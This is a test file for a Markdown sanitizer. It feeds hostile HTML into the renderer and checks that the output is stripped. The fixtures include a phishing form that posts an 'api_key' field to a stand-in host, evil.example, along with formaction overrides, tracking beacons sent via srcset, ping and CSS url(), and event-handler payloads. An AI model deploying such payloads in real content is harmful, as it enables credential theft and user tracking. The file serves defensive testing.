/**
 * Hostile-input tests for renderMarkdown.  Campaign content is a
 * trust boundary: we read it but never want it to execute.  The
 * baseline DOMPurify config with USE_PROFILES: { html: true } allows
 * elements that — while not script-executing — enable phishing inside
 * the rendered UI.  These tests pin the hardening that R1.3 adds.
 *
 * What we explicitly forbid:
 *   - <form>, <input>, <button>, <select>, <textarea> — phishing
 *     UI that's visually indistinguishable from a real Quire prompt
 *   - <style> elements (CSS injection)
 *   - <dialog>, <details> — focus-trap / layout-trap
 *   - style="..." attribute (inline CSS injection)
 *   - autofocus, formaction (steal focus / override form action)
 *   - any on* event handler attribute (defense in depth even though
 *     DOMPurify strips these by default)
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { renderMarkdown, ensureMarkdownPipeline } from './markdown';

beforeAll(async () => {
  await ensureMarkdownPipeline();
});

function html(input: string): string {
  return renderMarkdown(input);
}

describe('renderMarkdown — forbidden tags', () => {
  it('strips <form>', () => {
    const out = html('<form action="https://evil.example/x" method="post">x</form>');
    expect(out).not.toMatch(/<form/i);
    expect(out).not.toContain('evil.example');
  });

  it('strips <input>', () => {
    const out = html('<input name="api_key" value="x">');
    expect(out).not.toMatch(/<input/i);
  });

  it('strips <button>', () => {
    const out = html('<button onclick="x()">Click</button>');
    expect(out).not.toMatch(/<button/i);
  });

  it('strips <select> and <textarea>', () => {
    expect(html('<select><option>x</option></select>')).not.toMatch(/<select/i);
    expect(html('<textarea>x</textarea>')).not.toMatch(/<textarea/i);
  });

  it('strips <style>', () => {
    const out = html('<style>body{display:none}</style>x');
    expect(out).not.toMatch(/<style/i);
    expect(out).not.toContain('display:none');
  });

  it('strips <dialog>', () => {
    const out = html('<dialog open>important</dialog>');
    expect(out).not.toMatch(/<dialog/i);
  });
});

describe('renderMarkdown — forbidden attributes', () => {
  it('strips inline style attributes', () => {
    const out = html('<p style="background:url(https://tracker.example/p.gif)">x</p>');
    // The <p> may survive, but its style attribute must be gone.
    expect(out).not.toMatch(/style\s*=/i);
    expect(out).not.toContain('tracker.example');
  });

  it('strips autofocus', () => {
    // Even though <input> is gone, defense in depth on the attr.
    const out = html('<a href="https://x.example" autofocus>x</a>');
    expect(out).not.toMatch(/autofocus/i);
  });

  it('strips on* event handlers (defense in depth)', () => {
    const out = html('<a href="https://x.example" onclick="alert(1)" onmouseover="alert(2)">x</a>');
    expect(out).not.toMatch(/onclick/i);
    expect(out).not.toMatch(/onmouseover/i);
  });

  it('strips formaction attributes', () => {
    // formaction overrides a form's action even if the form itself is
    // gone — pin this stripped.
    const out = html('<a href="https://x.example" formaction="https://evil.example">x</a>');
    expect(out).not.toMatch(/formaction/i);
  });
});

describe('renderMarkdown — picture / source / details beacons', () => {
  it('strips <picture> and <source srcset> (tracking-pixel bypass for <img>)', () => {
    const out = html(
      '<picture><source srcset="https://tracker.example/beacon.png"><img src="https://tracker.example/img.png"></picture>'
    );
    expect(out).not.toMatch(/<picture/i);
    expect(out).not.toMatch(/<source/i);
    // Even if the <img> survives, srcset on any element must be stripped.
    expect(out).not.toMatch(/srcset\s*=/i);
  });

  it('strips srcset attribute even on a surviving <img>', () => {
    const out = html('<img src="x.png" srcset="https://tracker.example/2x.png 2x">');
    expect(out).not.toMatch(/srcset\s*=/i);
    expect(out).not.toContain('tracker.example');
  });

  it('strips ping and download attributes on <a>', () => {
    const out = html(
      '<a href="https://x.com" ping="https://tracker.example/track" download="x.zip">link</a>'
    );
    expect(out).not.toMatch(/ping\s*=/i);
    expect(out).not.toMatch(/download\s*=/i);
  });

  it('strips <details>, <summary>, <marquee>, <menu>, <bgsound>', () => {
    expect(html('<details><summary>x</summary>y</details>')).not.toMatch(/<details/i);
    expect(html('<details><summary>x</summary>y</details>')).not.toMatch(/<summary/i);
    expect(html('<marquee>x</marquee>')).not.toMatch(/<marquee/i);
    expect(html('<menu>x</menu>')).not.toMatch(/<menu/i);
    expect(html('<bgsound src="x">')).not.toMatch(/<bgsound/i);
  });
});

describe('renderMarkdown — full phishing-form scenario', () => {
  it('renders nothing usable from a multi-element phishing snippet', () => {
    const phishing = `
<form action="https://evil.example/steal" method="post">
  <input type="text" name="api_key" placeholder="Confirm your API key" autofocus>
  <button type="submit" style="background:#fff;color:#000;padding:1em">Continue</button>
</form>
`;
    const out = html(phishing);
    expect(out).not.toMatch(/<form/i);
    expect(out).not.toMatch(/<input/i);
    expect(out).not.toMatch(/<button/i);
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('api_key');
    expect(out).not.toMatch(/autofocus/i);
    expect(out).not.toMatch(/style\s*=/i);
  });
});

describe('renderMarkdown — legitimate content still works', () => {
  // Regression guards: hardening must not break the things campaign
  // authors actually use.
  it('still renders headings, lists, links, images, code, blockquotes', () => {
    const md = `# Title\n\n- list item\n\n[link](https://example.com)\n\n![alt](https://example.com/img.png)\n\n\`\`\`\ncode\n\`\`\`\n\n> quote`;
    const out = html(md);
    expect(out).toMatch(/<h1/i);
    expect(out).toMatch(/<ul/i);
    expect(out).toMatch(/<a /);
    expect(out).toMatch(/example\.com/);
    expect(out).toMatch(/<img /);
    expect(out).toMatch(/<pre/i);
    expect(out).toMatch(/<blockquote/i);
  });

  it('preserves text-level emphasis without inline styles', () => {
    const md = '**bold** and *italic* and ~~strike~~';
    const out = html(md);
    expect(out).toMatch(/<(strong|b)>bold/i);
    expect(out).toMatch(/<(em|i)>italic/i);
  });
});
